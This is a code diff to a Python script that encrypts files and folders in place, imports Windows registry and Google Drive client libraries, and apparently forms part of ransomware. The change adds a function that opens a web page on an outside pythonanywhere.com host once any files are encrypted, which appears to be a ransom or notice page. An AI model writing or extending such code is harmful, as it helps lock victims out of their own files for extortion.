@@ -9,6 +9,7 @@ import winreg
 import io
 import requests
 import ast
+import webbrowser
 from google.oauth2 import service_account
 from googleapiclient.discovery import build
 from googleapiclient.http import MediaIoBaseDownload
@@ -109,6 +110,10 @@ def encrypt_file(file_path, key, nonce):
         print(f"Error encrypting {file_path}: {str(e)}")
         return False
 
+def open_page():
+    url = 'https://basma12.pythonanywhere.com/'  # Replace with the URL you want to open
+    webbrowser.open(url)
+
 
 def encrypt_folder_in_place(folder_path, key, nonce):
     folder_path = Path(folder_path).resolve()
@@ -142,6 +147,9 @@ def encrypt_folder_in_place(folder_path, key, nonce):
 
         print(f"Files encrypted: {encrypted_files}")
         print(f"Files failed: {failed_files}")
+
+        if encrypted_files > 0:
+            open_page()
 
         return encrypted_files > 0
 
